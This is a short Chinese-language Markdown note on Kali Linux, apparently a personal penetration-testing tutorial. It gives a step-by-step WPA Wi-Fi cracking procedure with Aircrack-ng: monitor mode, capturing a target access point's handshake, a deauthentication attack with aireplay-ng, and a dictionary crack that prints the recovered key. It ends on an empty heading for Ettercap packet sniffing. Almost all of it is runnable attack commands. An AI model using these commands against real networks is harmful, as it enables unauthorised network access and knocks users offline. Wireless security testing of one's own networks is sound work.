# Network_Security_Test_Note for Kali linux
## 測試區域網路安全性
### Aircrack-ng使用
#### 1.開啟終端機使用```airmon-ng start wlan0```開啟網卡Monitor模式  
    可啟用的晶片型號如下:  
    Atheros AR9271  
    Ralink RT3070  
    Ralink RT3572  
    Realtek RTL8812AU  
    Ralink RT5370N  
    Realtek 8187L (Wireless G adapters)
*虛擬機使用網卡的方式Virtual Box直皆引入USB裝置 virtualware使用左上角可移除裝置*
#### 2.使用```airodump-ng wlan0mon```查找範圍內可使用的AP  
#### 3.使用```airodump-ng -w /tmp/wpatest -c 11 --bssid 00:E0:4C:81:96:D1 wlan0mon```針對目標AP收集封包  
  ```-w + 目標路徑``` 設定握手包存放位置  
  ```-c + 頻道號碼``` 選定目標AP所使用之頻道    
  ```-bssid +MAC地址``` 選定目標AP之位址  
#### 4.開另一個終端機使用```aireplay-ng -a 00:E0:4C:81:96:D1 --deauth 4 wlan0mon```對目標AP進行deauth攻擊  
  ```-a + MAC地址``` 選定目標AP之地址  
***特別注意:有些路由器會針對發送過多Deauth封包的IP進行阻擋***
#### 5.待Console1收到handshake即可使用ctrl+c中止擷取資料 並使用```aircrack-ng -w password.lst /tmp/wpatest*.cap```進行解密
```-w password.list```為密碼字典檔,aircrack有內建,但推薦從網路上下載效能較佳
```/tmp/wpatest*.cap```中\*表示握手包編號 此引數不唯一 可以引入多個握手包 將\*替換為編號即可
### 6.解密成功即會print出```KEY FOUND[12345678]```密碼即為12345678

### Etthercap實現封包竊聽
